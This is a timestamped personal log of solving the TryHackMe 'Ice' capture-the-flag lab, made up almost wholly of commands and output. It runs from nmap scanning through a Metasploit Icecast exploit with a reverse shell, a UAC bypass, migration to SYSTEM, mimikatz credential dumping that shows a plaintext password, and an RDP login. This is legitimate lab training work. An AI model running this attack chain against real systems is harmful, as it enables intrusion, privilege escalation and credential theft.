# https://tryhackme.com/room/ice

```bash
=================================
10.201.12.79 -- domain.com -- win x32/x64
=================================

echo 'export TARGET=10.201.12.79' >> ~/.zshrc && source ~/.zshrc

2025-09-03 18:31:44 -- sudo nmap -n -Pn -sS -p- -oA nmap $TARGET
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
8000/tcp  open  http-alt
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
49160/tcp open  unknown

2025-09-03 18:46:29 -- sudo nmap -n -Pn -sV -O -p 135,139,445,3389,5357,8000 -oA services $TARGET
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  tcpwrapped
5357/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  http         Icecast streaming media server
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 3 hops
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

2025-09-03 18:51:47 -- going for icecast
search icecast
use exploit/windows/http/icecast_header
set RHOSTS 10.201.12.79
set LHOST 10.6.4.0
set LPORT 54321
2025-09-03 18:55:47 -- run
// exploited!

Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

2025-09-03 19:08:19 -- run post/multi/recon/local_exploit_suggester
// exploit/windows/local/bypassuac_eventvwr

use exploit/windows/local/bypassuac_eventvwr
set payload windows/meterpreter/reverse_tcp
set SESSION 1
set lhost 10.6.4.0
set lport 50000
run

2025-09-03 19:19:50 -- getprivs
// SeTakeOwnershipPrivilege

2025-09-03 19:22:52 -- ps -S spoolsv
 PID   PPID  Name       Arch  Session  User            Path
 ---   ----  ----       ----  -------  ----            ----
 1264  692   spoolsv.e  x64   0        NT AUTHORITY\S  C:\Windows\Syst
             xe                        YSTEM           em32\spoolsv.ex
                                                       e
2025-09-03 19:23:42 -- migrate -N spoolsv.exe
// success
2025-09-03 19:24:03 -- getuid
Server username: NT AUTHORITY\SYSTEM
2025-09-03 19:24:36 -- load kiwi
// mimikatz
2025-09-03 19:25:42 -- creds_all
Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

2025-09-03 19:29:39 -- run post/windows/manage/enable_rdp

yes | xfreerdp3 /v:10.201.12.79 /u:Dark /p:'Password01!'
```